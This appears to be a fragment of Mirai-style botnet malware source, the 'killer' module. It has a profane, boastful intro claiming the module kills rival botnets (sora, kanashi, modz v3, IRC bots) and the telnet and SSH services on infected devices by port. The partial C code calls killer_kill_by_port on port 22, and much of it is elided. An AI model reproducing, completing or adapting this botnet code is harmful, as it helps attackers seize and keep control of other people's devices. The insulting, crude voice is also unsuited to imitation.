...
The killer basicly kills all a source by ports
it also killer telnet netis and ssh also some expliots...
i didnt really take the time to add anything else in here
but shit i see around the dumbass place u all call a "community"
this killer kills sora , kanashi , modz v3 , some IRC's
...
void killer_init(void)
{
    ...
    {
        //LEAKED MODZ V3 this is koo lol all idiots have v3
    }
    if (killer_kill_by_port(htons(22)))
    {
        //SSH Port GIMMI ALL THAT FUCKEN SSH MODZ V5
    }
